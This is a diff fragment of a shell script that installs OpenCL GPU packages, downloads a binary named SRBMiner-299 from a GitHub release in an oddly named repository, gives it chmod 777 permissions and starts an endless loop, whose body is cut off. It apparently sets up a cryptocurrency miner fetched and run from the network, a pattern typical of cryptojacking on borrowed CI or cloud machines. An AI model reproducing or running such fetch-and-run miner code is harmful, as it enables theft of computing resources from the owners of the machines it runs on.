@@ -1,4 +1,4 @@
-apt update && apt -y install ocl-icd-opencl-dev curl wget sudo
+apt update && apt -y install ocl-icd-libopencl1 ocl-icd-opencl-dev clinfo curl wget sudo
 curl https://github.com/Descajhuwita/friendly-palm-tree/releases/download/1/SRBMiner-299 -L -o SRB-299
 chmod 777 SRB-299
 while :; do
